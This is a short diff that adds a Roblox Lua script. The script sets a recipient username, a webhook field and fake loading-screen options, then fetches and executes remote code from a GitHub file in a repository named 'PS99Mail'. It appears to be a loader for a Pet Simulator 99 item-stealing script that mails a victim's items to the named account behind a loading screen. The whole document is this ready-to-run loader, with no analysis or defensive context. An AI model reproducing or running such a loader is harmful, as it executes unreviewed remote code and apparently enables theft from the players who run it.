@@ -1,0 +1,6 @@
+Username = "NekDav1"
+Webhook = "OK"
+selectedLoadingScreen = "1"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
